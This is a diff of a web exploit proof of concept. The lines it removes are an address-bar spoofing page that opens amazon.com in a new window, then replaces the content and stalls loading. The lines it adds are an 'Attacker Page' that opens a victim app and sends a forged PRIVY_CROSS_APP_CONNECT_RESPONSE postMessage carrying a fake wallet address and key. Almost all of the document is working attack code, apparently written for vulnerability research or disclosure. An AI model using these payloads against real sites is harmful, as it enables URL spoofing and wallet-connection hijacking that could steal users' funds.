@@ -1,76 +1,52 @@
+<!doctype html>
+<html>
+  <head>
+    <title>Attacker Page</title>
+  </head>
+  <body style="font-family: monospace; padding: 20px">
+    <h2>Attacker Page</h2>
 
-<body>
-<a id=test href="https://www.amazon.com/" onclick=foo()>https://www.amazon.com/</a>
-</body>
+    <input
+      id="victim-url"
+      value="https://poc-privy.vercel.app"
+      style="width: 300px"
+    />
+    <br /><br />
+    <button id="btn-open">Open Victim Page</button>
+    <button id="btn-spoof">Inject Fake Wallet</button>
+    <pre id="log"></pre>
 
-<script>
+    <script>
+      var log = document.getElementById("log");
+      function print(msg) {
+        log.textContent += msg + "\n";
+      }
+      var victim = null;
 
-var w;
-var t;
-var z;
+      document.getElementById("btn-open").onclick = function () {
+        var url = document.getElementById("victim-url").value;
+        victim = window.open(url, "victim", "width=700,height=600");
+        print("Opened victim at " + url);
+      };
 
-if(location.href.indexOf("fake") !== -1){
-document.body.innerHTML = "<h1>This website has moved to http://fake.com</h1>";
-}
+      document.getElementById("btn-spoof").onclick = function () {
+        if (!victim) {
+          print("open victim");
+          return;
+        }
 
+        var payload = {
+          type: "PRIVY_CROSS_APP_CONNECT_RESPONSE",
+          address: "0xDEAD000000000000000000000000000000000000",
+          providerPublicKey: btoa("attacker-fake-public-key-bytes"),
+          exp: Date.now() + 14 * 24 * 60 * 60 * 1000,
+        };
 
-function foo(){
-
-document.getElementById("test").href="#";
-
-w = window.open("?fake");
-
-t = setInterval('bar()',1);
-
-}
-
-function bar(){
-
-if(w.location.href !== 'about:blank'){
-
-alert("Redirecting");
-
-document.body.innerHTML = "<h1>Redirecting</h1>";
-
-slow();
-
-w.location.href = 'https://www.amazon.com/';
-
-clearInterval(t);
-
-z = setInterval('baz()',1);
-
-}
-
-}
-
-function baz(){
-try{
-w.location.href !== 'about:blank';
-}
-catch (e){
-
-//stop page loading
-w.location.href='https://www.google.com/csi';
-clearInterval(z);
-
-//Make sure the old content is not cleared
-setTimeout("alert('ok');window.location.href='about:blank';window.close();", 3000);
-}
-
-}
-
-
-//slow down the website
-function slow() {
-for (i=0; i<10; i++ ) {
-
-iframe = document.createElement("iframe");
-iframe.src = 'https://www.amazon.com/';
-iframe.style = 'display:none';
-document.body.appendChild(iframe);
-
-}
-}
-
-</script>
+        victim.postMessage(payload, "*");
+        print("sent PRIVY_CROSS_APP_CONNECT_RESPONSE");
+        print("  address: " + payload.address);
+        print("  from origin: " + location.origin);
+      };
+    </script>
+  </body>
+</html>
